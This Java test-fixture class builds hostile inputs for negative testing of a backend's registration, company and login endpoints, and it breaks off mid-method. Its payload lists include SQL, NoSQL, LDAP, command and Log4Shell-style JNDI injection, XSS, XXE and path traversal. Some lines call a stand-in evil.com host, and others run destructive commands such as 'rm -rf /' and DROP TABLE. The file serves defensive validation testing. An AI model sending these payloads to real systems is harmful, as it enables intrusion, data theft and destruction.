package dev.hope.vulcaobackend;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * Comprehensive bad-data / hostile-input fixtures for negative testing.
 *
 * Categories covered:
 *   - Missing / null / empty fields
 *   - Type confusion (string where number expected, etc.)
 *   - Length / size boundary violations
 *   - SQL injection (classic, blind, time-based, UNION, stacked)
 *   - NoSQL injection (Mongo-style operators)
 *   - LDAP injection
 *   - Command injection / shell metacharacters
 *   - XSS (HTML, JS, SVG, event handlers, encoded variants)
 *   - Path traversal / LFI / RFI
 *   - XXE / XML bomb payloads
 *   - Template / SSTI / EL injection
 *   - CRLF / header injection / log injection
 *   - Format string attacks
 *   - ReDoS payloads
 *   - Unicode / encoding attacks (RTL override, homographs, zero-width, BOM, null bytes)
 *   - Numeric edge cases (overflow, negatives, scientific notation, leading zeros)
 *   - Email RFC edge cases
 *   - Password edge cases (common, empty, whitespace, equal-to-username)
 *   - JSON parser stress (deep nesting, duplicate keys, huge arrays)
 *   - Business-logic flaws (self-reference, duplicate, role escalation)
 *   - Auth bypass attempts (token tampering, role injection, mass assignment)
 *   - Concurrency / replay markers
 *   - Date / time edge cases
 *
 * Every method is intentionally hostile. Run these against staging only.
 */
public class BadDummyData {

    // ====================================================================
    //  USER REGISTRATION
    // ====================================================================

    public List<JSONObject> getBadUserRegistrationData() throws JSONException {
        List<JSONObject> users = new ArrayList<>();

        // ---------- Missing / empty / null ----------
        users.add(new JSONObject().put("username", "").put("email", "missingfields@gmail.com"));
        users.add(new JSONObject()); // completely empty
        users.add(new JSONObject()
                .put("username", JSONObject.NULL)
                .put("firstName", JSONObject.NULL)
                .put("lastName", "NullTest")
                .put("email", "null@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "   ") // whitespace only
                .put("firstName", "\t\t")
                .put("lastName", "\n\n")
                .put("email", " spaced@test.com ")
                .put("password", "        "));
        users.add(new JSONObject()
                .put("username", "tabsAndNewlines\t\n\r")
                .put("firstName", "Control\u0008Char")    // backspace
                .put("lastName", "Bell\u0007")              // bell
                .put("email", "ctrl@test.com")
                .put("password", "Password123"));

        // ---------- Type confusion ----------
        users.add(new JSONObject()
                .put("username", 12345)                // number instead of string
                .put("firstName", true)                // boolean
                .put("lastName", new JSONArray().put("array").put("of").put("strings"))
                .put("email", new JSONObject().put("nested", "object"))
                .put("password", 99999999.99));

        // ---------- Email format zoo ----------
        String[] badEmails = {
                "not-an-email",
                "@no-local-part.com",
                "no-at-sign.com",
                "no-domain@",
                "spaces in@email.com",
                "double@@at.com",
                "trailing.dot.@example.com",
                ".leading.dot@example.com",
                "consecutive..dots@example.com",
                "user@.startswithdot.com",
                "user@no-tld",
                "user@-leading-hyphen.com",
                "user@trailing-hyphen-.com",
                "<script>alert(1)</script>@xss.com",
                "user@[127.0.0.1]",                          // IP literal
                "user@[IPv6:::1]",
                "\"weird\"@example.com",
                "very.\"(),:;<>[]\\\".VERY.\\\"very@\\\\ \\\"very\\\".unusual\"@strange.example.com",
                "a@b",                                        // technically valid, often rejected
                "user+tag+sorting@example.com",
                "user@subdomain.subdomain.subdomain.subdomain.example.com",
                "用户@例子.广告",                              // Unicode local & domain
                "Pelé@example.com",
                "अजय@example.com",
                "उदाहरण.परीक्षा@hindi.example",
                "email@" + "a".repeat(64) + ".com",           // long subdomain
                "a".repeat(65) + "@example.com",              // local part > 64 (RFC limit)
                "email@example." + "a".repeat(64),
                "email@example.com\r\nBcc: attacker@evil.com",// header injection
                "email@example.com\u0000@evil.com",           // null byte truncation
                "email@example.com%00@evil.com",
        };
        int i = 0;
        for (String em : badEmails) {
            users.add(new JSONObject()
                    .put("username", "emailFuzz" + i++)
                    .put("firstName", "Email")
                    .put("lastName", "Fuzz")
                    .put("email", em)
                    .put("password", "Password123"));
        }

        // ---------- Weak / dangerous passwords ----------
        String[] badPasswords = {
                "",                  // empty
                " ",                 // single space
                "        ",          // spaces only
                "1",
                "12",
                "123",
                "password",
                "Password",
                "Password1",
                "qwerty",
                "letmein",
                "admin",
                "root",
                "welcome",
                "abc123",
                "iloveyou",
                "monkey",
                "dragon",
                "111111",
                "000000",
                "a".repeat(1),
                "a".repeat(7),       // just below typical 8-char minimum
                "a".repeat(10000),   // huge
                "\u0000\u0000\u0000",// null bytes
                "Password123\u0000extra", // null-byte truncation
                "Pässwörd123",       // diacritics (normalization issues)
                "Password\uFEFF123", // zero-width BOM
                "Password\u200B123", // zero-width space
                "🔑🔒🛡️🗝️password",  // emoji
                "../../etc/passwd",
                "<script>alert(1)</script>",
                "' OR '1'='1",
        };
        int p = 0;
        for (String pw : badPasswords) {
            users.add(new JSONObject()
                    .put("username", "pwFuzz" + p++)
                    .put("firstName", "PW")
                    .put("lastName", "Fuzz")
                    .put("email", "pw" + p + "@test.com")
                    .put("password", pw));
        }

        // ---------- Username = password (weak business rule) ----------
        users.add(new JSONObject()
                .put("username", "samesame")
                .put("firstName", "Same")
                .put("lastName", "Same")
                .put("email", "same@test.com")
                .put("password", "samesame"));

        // ---------- Username = email (mixing identifiers) ----------
        users.add(new JSONObject()
                .put("username", "identity@test.com")
                .put("firstName", "Mixed")
                .put("lastName", "Identifier")
                .put("email", "identity@test.com")
                .put("password", "Password123"));

        // ---------- Length boundaries ----------
        users.add(new JSONObject()
                .put("username", "a".repeat(500))
                .put("firstName", "Long")
                .put("lastName", "String")
                .put("email", "long@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "a".repeat(65535)) // common DB VARCHAR ceiling
                .put("firstName", "X".repeat(10000))
                .put("lastName", "Y".repeat(10000))
                .put("email", "huge@test.com")
                .put("password", "Z".repeat(10000)));
        users.add(new JSONObject()
                .put("username", "a")               // 1 char – may violate min length
                .put("firstName", "")
                .put("lastName", "")
                .put("email", "x@y.z")
                .put("password", "P1!"));

        // ---------- SQL injection (classic) ----------
        String[] sqliPayloads = {
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "') OR ('1'='1",
                "1' OR 1=1--",
                "1' OR '1'='1' LIMIT 1 -- -+",
                "admin'; DROP TABLE users; --",
                "admin'; DROP TABLE users CASCADE; --",
                "'; DELETE FROM users WHERE 1=1; --",
                "'; UPDATE users SET role='ADMIN' WHERE username='attacker'; --",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username, password FROM users--",
                "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
                "1' AND 1=CONVERT(int,(SELECT @@version))--", // error-based
                "1' AND SLEEP(5)--",                          // time-based MySQL
                "1'; WAITFOR DELAY '0:0:5'--",                // time-based MSSQL
                "1' AND pg_sleep(5)--",                       // time-based Postgres
                "1' AND (SELECT COUNT(*) FROM users) > 0--",  // boolean blind
                "1' AND SUBSTRING(@@version,1,1)='5'--",      // blind extraction
                "admin' AND 1=(SELECT 1 FROM users WHERE SUBSTR(password,1,1)='a')--",
                "x' OR 'a'='a",
                "0x27204f522027312733d27312027",               // hex-encoded
                "'%20OR%20'1'='1",                             // URL-encoded
                "%27%20OR%20%271%27%3D%271",
        };
        int s = 0;
        for (String inj : sqliPayloads) {
            users.add(new JSONObject()
                    .put("username", inj)
                    .put("firstName", "SQLi")
                    .put("lastName", "User" + s)
                    .put("email", "sqli" + s++ + "@test.com")
                    .put("password", inj));
        }

        // ---------- NoSQL injection (Mongo-style operator smuggling) ----------
        users.add(new JSONObject()
                .put("username", new JSONObject().put("$ne", JSONObject.NULL))
                .put("firstName", "NoSQL")
                .put("lastName", "Inject")
                .put("email", "nosql1@test.com")
                .put("password", new JSONObject().put("$ne", JSONObject.NULL)));
        users.add(new JSONObject()
                .put("username", new JSONObject().put("$gt", ""))
                .put("firstName", "NoSQL")
                .put("lastName", "Gt")
                .put("email", "nosql2@test.com")
                .put("password", new JSONObject().put("$gt", "")));
        users.add(new JSONObject()
                .put("username", new JSONObject().put("$regex", ".*"))
                .put("firstName", "NoSQL")
                .put("lastName", "Regex")
                .put("email", "nosql3@test.com")
                .put("password", new JSONObject().put("$regex", ".*")));
        users.add(new JSONObject()
                .put("username", new JSONObject().put("$where", "this.password == this.username"))
                .put("firstName", "NoSQL")
                .put("lastName", "Where")
                .put("email", "nosql4@test.com")
                .put("password", "anything"));

        // ---------- LDAP injection ----------
        String[] ldap = {
                "*",
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*)(|(objectClass=*",
                "admin*",
                "admin)(&)",
        };
        int l = 0;
        for (String x : ldap) {
            users.add(new JSONObject()
                    .put("username", x)
                    .put("firstName", "LDAP")
                    .put("lastName", "Inject")
                    .put("email", "ldap" + l++ + "@test.com")
                    .put("password", x));
        }

        // ---------- Command / shell injection ----------
        String[] cmd = {
                "; ls -la",
                "&& whoami",
                "| cat /etc/passwd",
                "|| id",
                "`whoami`",
                "$(whoami)",
                "$(curl http://evil.com/x)",
                "; rm -rf /",
                "; shutdown -h now",
                "\n/bin/bash\n",
                "%0als%20-la",
                "&ping -c 10 127.0.0.1&",
        };
        int c = 0;
        for (String x : cmd) {
            users.add(new JSONObject()
                    .put("username", "cmdUser" + c)
                    .put("firstName", x)
                    .put("lastName", "CmdInject")
                    .put("email", "cmd" + c++ + "@test.com")
                    .put("password", "Password123"));
        }

        // ---------- XSS payload library ----------
        String[] xss = {
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script src=//evil.com/x.js></script>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
                "<svg onload=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<iframe srcdoc=\"<script>alert(1)</script>\">",
                "<a href=javascript:alert(1)>click</a>",
                "javascript:alert(1)",
                "<input autofocus onfocus=alert(1)>",
                "<select autofocus onfocus=alert(1)>",
                "<textarea autofocus onfocus=alert(1)>",
                "<keygen autofocus onfocus=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>x</marquee>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "</title><script>alert(1)</script>",
                "</textarea><script>alert(1)</script>",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
                "jaVaScRiPt:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                // polyglot
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        };
        int xi = 0;
        for (String x : xss) {
            users.add(new JSONObject()
                    .put("username", "xss" + xi)
                    .put("firstName", x)
                    .put("lastName", x)
                    .put("email", "xss" + xi++ + "@test.com")
                    .put("password", "Password123"));
        }

        // ---------- Path traversal ----------
        String[] traversal = {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%c0%af..%c0%afetc%c0%afpasswd",
                "/etc/passwd%00.png",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "\\\\evil.com\\share\\file",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
        };
        int t = 0;
        for (String x : traversal) {
            users.add(new JSONObject()
                    .put("username", "trav" + t)
                    .put("firstName", x)
                    .put("lastName", "Path")
                    .put("email", "trav" + t++ + "@test.com")
                    .put("password", "Password123"));
        }

        // ---------- Unicode / encoding attacks ----------
        users.add(new JSONObject()
                .put("username", "\u202Eadmin")               // RTL override
                .put("firstName", "RTL")
                .put("lastName", "Override")
                .put("email", "rtl@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "аdmin")                     // Cyrillic 'а' homograph
                .put("firstName", "Homograph")
                .put("lastName", "Cyrillic")
                .put("email", "homo@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "admin\u200B")               // zero-width space
                .put("firstName", "Zero")
                .put("lastName", "Width")
                .put("email", "zw@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "\uFEFFadmin")               // BOM
                .put("firstName", "BOM")
                .put("lastName", "Marker")
                .put("email", "bom@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "admin\u0000extra")          // null-byte truncation
                .put("firstName", "Null")
                .put("lastName", "Byte")
                .put("email", "nb@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "ﬃ")                          // single codepoint that decomposes to "ffi"
                .put("firstName", "Ligature")
                .put("lastName", "Normalize")
                .put("email", "lig@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "Å")                         // can be U+00C5 or U+212B (visually identical)
                .put("firstName", "Norm")
                .put("lastName", "NFD")
                .put("email", "norm@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "👨‍💻🚀💀")
                .put("firstName", "Emoji")
                .put("lastName", "ZWJ")
                .put("email", "emoji@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "admin\uD83D")               // unpaired surrogate
                .put("firstName", "Bad")
                .put("lastName", "Surrogate")
                .put("email", "surr@test.com")
                .put("password", "Password123"));

        // ---------- CRLF / header / log injection ----------
        users.add(new JSONObject()
                .put("username", "user\r\nSet-Cookie: admin=true")
                .put("firstName", "CRLF")
                .put("lastName", "Inject")
                .put("email", "crlf1@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "user\nLocation: http://evil.com")
                .put("firstName", "Header")
                .put("lastName", "Smuggle")
                .put("email", "crlf2@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "user%0d%0aSet-Cookie:admin=true")
                .put("firstName", "Encoded")
                .put("lastName", "CRLF")
                .put("email", "crlf3@test.com")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "fakeuser\n[INFO] User admin logged in successfully")
                .put("firstName", "Log")
                .put("lastName", "Forge")
                .put("email", "log@test.com")
                .put("password", "Password123"));

        // ---------- Format string ----------
        users.add(new JSONObject()
                .put("username", "%s%s%s%s%s%s%s%s%s%s")
                .put("firstName", "%n%n%n%n%n%n")
                .put("lastName", "%x.%x.%x.%x")
                .put("email", "fmt@test.com")
                .put("password", "%08x.%08x.%08x.%08x"));

        // ---------- Template / SSTI / EL / JNDI ----------
        String[] tmpl = {
                "${7*7}",
                "{{7*7}}",
                "<%= 7*7 %>",
                "#{7*7}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${jndi:ldap://evil.com/a}",            // log4shell
                "${jndi:rmi://evil.com/a}",
                "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
        };
        int ti = 0;
        for (String x : tmpl) {
            users.add(new JSONObject()
                    .put("username", "tmpl" + ti)
                    .put("firstName", x)
                    .put("lastName", "Template")
                    .put("email", "tmpl" + ti++ + "@test.com")
                    .put("password", "Password123"));
        }

        // ---------- Mass assignment / privilege escalation ----------
        users.add(new JSONObject()
                .put("username", "massAssign1")
                .put("firstName", "Mass")
                .put("lastName", "Assign")
                .put("email", "mass1@test.com")
                .put("password", "Password123")
                .put("role", "ADMIN")
                .put("isAdmin", true)
                .put("admin", 1)
                .put("authorities", new JSONArray().put("ROLE_ADMIN").put("ROLE_SUPERUSER"))
                .put("permissions", new JSONArray().put("*"))
                .put("verified", true)
                .put("emailVerified", true)
                .put("active", true)
                .put("enabled", true)
                .put("locked", false)
                .put("id", 1)
                .put("userId", 1)
                .put("createdAt", "1970-01-01T00:00:00Z")
                .put("password_hash", "$2a$10$abcdefghijklmnopqrstuv"));

        users.add(new JSONObject()
                .put("username", "massAssign2")
                .put("firstName", "Mass")
                .put("lastName", "Assign2")
                .put("email", "mass2@test.com")
                .put("password", "Password123")
                .put("__proto__", new JSONObject().put("isAdmin", true)) // prototype pollution
                .put("constructor", new JSONObject().put("prototype", new JSONObject().put("isAdmin", true))));

        // ---------- Duplicate JSON keys (parser-dependent behavior) ----------
        // Note: JSONObject collapses these, so build raw string and re-parse:
        String dupRaw = "{\"username\":\"dup1\",\"username\":\"dup2\",\"email\":\"dup@test.com\","
                + "\"password\":\"Password123\",\"role\":\"USER\",\"role\":\"ADMIN\"}";
        users.add(new JSONObject(dupRaw));

        // ---------- Duplicate username (collision) ----------
        users.add(new JSONObject()
                .put("username", "testUser1")
                .put("firstName", "Duplicate")
                .put("lastName", "User")
                .put("email", "duplicate@test.com")
                .put("password", "Password123"));

        // ---------- Case-only difference (case-sensitivity bugs) ----------
        users.add(new JSONObject()
                .put("username", "TestUser1")
                .put("firstName", "Case")
                .put("lastName", "Variant")
                .put("email", "TESTUSER1@TEST.COM")
                .put("password", "Password123"));
        users.add(new JSONObject()
                .put("username", "testuser1")
                .put("firstName", "Lower")
                .put("lastName", "Variant")
                .put("email", "testuser1@test.com")
                .put("password", "Password123"));

        return users;
    }

    // ====================================================================
    //  EMPLOYER REGISTRATION
    // ====================================================================

    public List<JSONObject> getBadEmployerRegistrationData() throws JSONException {
        List<JSONObject> employers = new ArrayList<>();

        employers.add(new JSONObject()); // empty

        employers.add(new JSONObject()
                .put("username", "!!!@@@###")
                .put("firstName", "Invalid")
                .put("lastName", "Chars")
                .put("email", "invalid@chars.com")
                .put("password", "Password123"));

        employers.add(new JSONObject()
                .put("username", "longEmailEmployer")
                .put("firstName", "Long")
                .put("lastName", "Email")
                .put("email", "a".repeat(300) + "@gmail.com")
                .put("password", "Password123"));

        employers.add(new JSONObject()
                .put("username", "noPassword")
                .put("firstName", "No")
                .put("lastName", "Password")
                .put("email", "nopass@test.com"));

        // Role escalation attempt
        employers.add(new JSONObject()
                .put("username", "fakeEmployer")
                .put("firstName", "Fake")
                .put("lastName", "Employer")
                .put("email", "fake@employer.com")
                .put("password", "Password123")
                .put("role", "SUPER_ADMIN")
                .put("verified", true)
                .put("approved", true)
                .put("companyVerified", true));

        // Reserved usernames
        String[] reserved = {
                "admin", "administrator", "root", "system", "support",
                "anonymous", "null", "undefined", "test", "guest",
                "API", "system_user", "postgres", "sa", "service",
                "Admin", "ADMIN", "ADMINISTRATOR",
                "admin ", " admin", "ad min", "admin\t", "admin\n",
                "admin@", "admin/", "admin\\", "admin?", "admin#",
        };
        int r = 0;
        for (String x : reserved) {
            employers.add(new JSONObject()
                    .put("username", x)
                    .put("firstName", "Reserved")
                    .put("lastName", "Name" + r)
                    .put("email", "reserved" + r++ + "@test.com")
                    .put("password", "Password123"));
        }

        // Filename-style usernames
        employers.add(new JSONObject()
                .put("username", "../../../etc/passwd")
                .put("firstName", "Path")
                .put("lastName", "Username")
                .put("email", "path@test.com")
                .put("password", "Password123"));
        employers.add(new JSONObject()
                .put("username", "user.exe")
                .put("firstName", "Exe")
                .put("lastName", "Name")
                .put("email", "exe@test.com")
                .put("password", "Password123"));

        // Single emoji username
        employers.add(new JSONObject()
                .put("username", "👤")
                .put("firstName", "Just")
                .put("lastName", "Emoji")
                .put("email", "emoji-only@test.com")
                .put("password", "Password123"));

        return employers;
    }

    // ====================================================================
    //  STAFF REGISTRATION
    // ====================================================================

    public JSONArray getBadStaffRegistrationData(String companyId) throws JSONException {
        JSONArray staff = new JSONArray();

        staff.put(new JSONObject()
                .put("username", "nullCompany")
                .put("email", "null@company.com")
                .put("password", "Password123")
                .put("companyId", JSONObject.NULL));

        staff.put(new JSONObject()
                .put("username", "badCompanyId")
                .put("email", "bad@company.com")
                .put("password", "Password123")
                .put("companyId", "###INVALID###"));

        staff.put(new JSONObject()
                .put("email", "nouser@test.com")
                .put("password", "Password123")
                .put("companyId", companyId));

        // CompanyId type confusion
        staff.put(new JSONObject()
                .put("username", "intCompanyId")
                .put("email", "int@company.com")
                .put("password", "Password123")
                .put("companyId", -1));
        staff.put(new JSONObject()
                .put("username", "boolCompanyId")
                .put("email", "bool@company.com")
                .put("password", "Password123")
                .put("companyId", true));
        staff.put(new JSONObject()
                .put("username", "arrayCompanyId")
                .put("email", "arr@company.com")
                .put("password", "Password123")
                .put("companyId", new JSONArray().put(companyId).put("hijacked")));
        staff.put(new JSONObject()
                .put("username", "objCompanyId")
                .put("email", "obj@company.com")
                .put("password", "Password123")
                .put("companyId", new JSONObject().put("$ne", JSONObject.NULL)));

        // Cross-tenant access attempts
        staff.put(new JSONObject()
                .put("username", "crossTenant1")
                .put("email", "x1@company.com")
                .put("password", "Password123")
                .put("companyId", "00000000-0000-0000-0000-000000000000"));
        staff.put(new JSONObject()
                .put("username", "crossTenant2")
                .put("email", "x2@company.com")
                .put("password", "Password123")
                .put("companyId", "*"));
        staff.put(new JSONObject()
                .put("username", "crossTenant3")
                .put("email", "x3@company.com")
                .put("password", "Password123")
                .put("companyId", "%"));

        // UUID-like but malformed
        staff.put(new JSONObject()
                .put("username", "fakeUuid")
                .put("email", "uuid@company.com")
                .put("password", "Password123")
                .put("companyId", "ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ"));

        // SQL in companyId
        staff.put(new JSONObject()
                .put("username", "sqlCompany")
                .put("email", "sqlc@company.com")
                .put("password", "Password123")
                .put("companyId", "1' OR '1'='1"));

        // Role injection
        staff.put(new JSONObject()
                .put("username", "roleInject")
                .put("email", "role@company.com")
                .put("password", "Password123")
                .put("companyId", companyId)
                .put("role", "OWNER")
                .put("isOwner", true)
                .put("permissions", new JSONArray().put("*")));

        return staff;
    }

    // ====================================================================
    //  COMPANY DATA
    // ====================================================================

    public List<JSONObject> getBadCompanyData(String creatorUsername) throws JSONException {
        List<JSONObject> companies = new ArrayList<>();

        // Negative & boundary numeric
        companies.add(new JSONObject()
                .put("name", "Negative Corp")
                .put("type", "Corporation")
                .put("taxIdentificationNumber", "00-0000000")
                .put("revenue", -1000000)
                .put("email", "neg@corp.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "MaxLong Corp")
                .put("type", "Corporation")
                .put("revenue", Long.MAX_VALUE)
                .put("email", "maxlong@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "MinLong Corp")
                .put("type", "Corporation")
                .put("revenue", Long.MIN_VALUE)
                .put("email", "minlong@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Overflow Corp")
                .put("type", "Corporation")
                .put("revenue", Double.MAX_VALUE)
                .put("email", "overflow@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Tiny Corp")
                .put("type", "Corporation")
                .put("revenue", Double.MIN_VALUE)
                .put("email", "tiny@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Zero Corp")
                .put("type", "Corporation")
                .put("revenue", 0)
                .put("email", "zero@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "NegativeZero")
                .put("type", "Corporation")
                .put("revenue", -0.0)
                .put("email", "negzero@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Scientific Corp")
                .put("type", "Corporation")
                .put("revenue", 1.0e308)
                .put("email", "sci@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Tiny Decimal Corp")
                .put("type", "Corporation")
                .put("revenue", 0.00000000000000000000001)
                .put("email", "decimal@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "String Revenue")
                .put("type", "Corporation")
                .put("revenue", "1,000,000.00") // string with thousands separator
                .put("email", "str@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Hex Revenue")
                .put("type", "Corporation")
                .put("revenue", "0xDEADBEEF")
                .put("email", "hex@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "Leading Zero Revenue")
                .put("type", "Corporation")
                .put("revenue", "007")              // octal trap?
                .put("email", "octal@test.com")
                .put("creatorUsername", creatorUsername));

        // Phone number zoo
        String[] badPhones = {
                "123-ABC-!!!!",
                "555",
                "1",
                "0",
                "+++++",
                "999-999-9999".repeat(50),
                "+1 (555) 555-5555 ext. 12345 ext. 67890",
                "📞📞📞",
                "<script>alert(1)</script>",
                "' OR '1'='1",
                "+999999999999999999999999999999",
                "0000000000",
                "911",
                "1234567890123456789012345678901234567890",
                "tel:+1-555-555-5555",
                "javascript:alert(1)",
        };
        int ph = 0;
        for (String p : badPhones) {
            companies.add(new JSONObject()
                    .put("name", "PhoneCorp" + ph)
                    .put("type", "LLC")
                    .put("phoneNumber", p)
                    .put("email", "phone" + ph++ + "@bad.com")
                    .put("creatorUsername", creatorUsername));
        }

        // Tax ID format violations
        String[] badTax = {
                "",
                "abc",
                "00-0000000",
                "12-345678",          // too short
                "12-3456789012345",   // too long
                "AB-CDEFGHI",
                "<script>",
                "' OR 1=1--",
                "123-45-6789",        // SSN format used as TIN
                "111-11-1111",
        };
        int tx = 0;
        for (String t : badTax) {
            companies.add(new JSONObject()
                    .put("name", "TaxCorp" + tx)
                    .put("type", "Corporation")
                    .put("taxIdentificationNumber", t)
                    .put("email", "tax" + tx++ + "@bad.com")
                    .put("creatorUsername", creatorUsername));
        }

        // Empty / missing required fields
        companies.add(new JSONObject()
                .put("name", "")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject().put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()); // entirely empty

        // Name boundaries
        companies.add(new JSONObject()
                .put("name", "a")
                .put("type", "LLC")
                .put("email", "1char@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "X".repeat(10000))
                .put("type", "LLC")
                .put("email", "longname@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "    ")    // whitespace only
                .put("type", "LLC")
                .put("email", "ws@test.com")
                .put("creatorUsername", creatorUsername));
        companies.add(new JSONObject()
                .put("name", "\u0000Hidden Corp")
                .put("type", "LLC")
                .put("email", "hidden@test.com")
                .put("creatorUsername", creatorUsername));

        // Invalid creator (privilege bypass)
        companies.add(new JSONObject()
                .put("name", "Spoofed Creator")
                .put("type", "LLC")
                .put("email", "spoof@test.com")
                .put("creatorUsername", "admin"));
        companies.add(new JSONObject()
                .put("name", "Null Creator")
                .put("type", "LLC")
                .put("email", "nullcreator@test.com")
                .put("creatorUsername", JSONObject.NULL));
        companies.add(new JSONObject()
                .put("name", "Empty Creator")
                .put("type", "LLC")
                .put("email", "empty@test.com")
                .put("creatorUsername", ""));
        companies.add(new JSONObject()
                .put("name", "Nonexistent Creator")
                .put("type", "LLC")
                .put("email", "nope@test.com")
                .put("creatorUsername", "userThatDoesNotExist_" + System.nanoTime()));

        // Type field zoo
        String[] badTypes = {
                "", " ", "INVALID_TYPE", "<script>", "Corporation' OR 1=1--",
                "🏢", "DROP TABLE companies", "../../etc/passwd", "null", "undefined",
        };
        int tp = 0;
        for (String x : badTypes) {
            companies.add(new JSONObject()
                    .put("name", "TypeCorp" + tp)
                    .put("type", x)
                    .put("email", "type" + tp++ + "@test.com")
                    .put("creatorUsername", creatorUsername));
        }

        // XXE in name field
        companies.add(new JSONObject()
                .put("name", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>")
                .put("type", "Corporation")
                .put("email", "xxe@test.com")
                .put("creatorUsername", creatorUsername));

        // Billion laughs
        companies.add(new JSONObject()
                .put("name", "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>")
                .put("type", "Corporation")
                .put("email", "billion@laughs.com")
                .put("creatorUsername", creatorUsername));

        // Duplicate company creation flood marker
        for (int k = 0; k < 5; k++) {
            companies.add(new JSONObject()
                    .put("name", "DuplicateCorp")
                    .put("type", "LLC")
                    .put("email", "dup@test.com")
                    .put("creatorUsername", creatorUsername));
        }

        return companies;
    }

    // ====================================================================
    //  LOGIN
    // ====================================================================

    public JSONArray getBadLoginData() throws JSONException {
        JSONArray logins = new JSONArray();

        // Missing fields
        logins.put(new JSONObject().put("username", "userOnly"));
        logins.put(new JSONObject().put("password", "Password123"));
        logins.put(new JSONObject());
        logins.put(new JSONObject().put("username", "").put("password", ""));
        logins.put(new JSONObject().put("username", JSONObject.NULL).put("password", JSONObject.NULL));

        // Length attacks
        logins.put(new JSONObject().put("username", "longPassUser").put("password", "a".repeat(1000)));
        logins.put(new JSONObject().put("username", "a".repeat(10000)).put("password", "Password123"));
        logins.put(new JSONObject().put("username", "a".repeat(1_000_000)).put("password", "b".repeat(1_000_000)));

        // Whitespace handling
        logins.put(new JSONObject().put("username", " admin ").put("password", " Password123 "));
        logins.put(new JSONObject().put("username", "\tadmin\t").put("password", "\tPassword123\t"));
        logins.put(new JSONObject().put("username", "admin\n").put("password", "Password123\n"));

        // Unicode normalization (NFC vs NFD)
        logins.put(new JSONObject().put("username", "café").put("password", "Password123")); // composed
        logins.put(new JSONObject().put("username", "cafe\u0301").put("password", "Password123")); // decomposed
